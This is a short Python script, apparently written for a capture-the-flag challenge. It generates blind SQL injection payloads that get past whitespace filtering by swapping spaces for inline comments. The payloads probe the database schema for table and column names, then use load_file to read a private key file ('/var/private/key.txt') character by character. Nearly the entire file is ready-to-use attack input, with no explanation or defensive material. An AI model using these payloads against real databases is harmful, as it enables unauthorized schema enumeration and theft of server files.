#!/usr/python/bin


def fix_whitespace(s):
	return s.replace(" ", "/**/")


print fix_whitespace("select count(TABLE_NAME) from information_schema.tables where table_schema = 'robots' and table_name like 'movies'")
print fix_whitespace("' and (select count(TABLE_NAME) from information_schema.tables where table_schema = 'bot' and table_name like 'movies') = 2 and ''='")
print fix_whitespace("' and (select count(*) from information_schema.columns where table_schema = 'bot' and table_name like 'movies')=1 and ''='")
print fix_whitespace("' and (select count(*) from information_schema.columns where table_schema = 'bot' and table_name like 'movies' and column_name like 'id')=1 and ''='")
#(select char_length(hex(load_file('/var/private/key.txt')))) > 20
print fix_whitespace("' and (select char_length(hex(load_file('/var/private/key.txt'))))>5 and ''='")
#select mid(load_file('/var/private/key.txt'), 1, 1) = 'h'
print fix_whitespace("' and (select mid(load_file('/var/private/key.txt'), 1, 1))='a' and ''='")

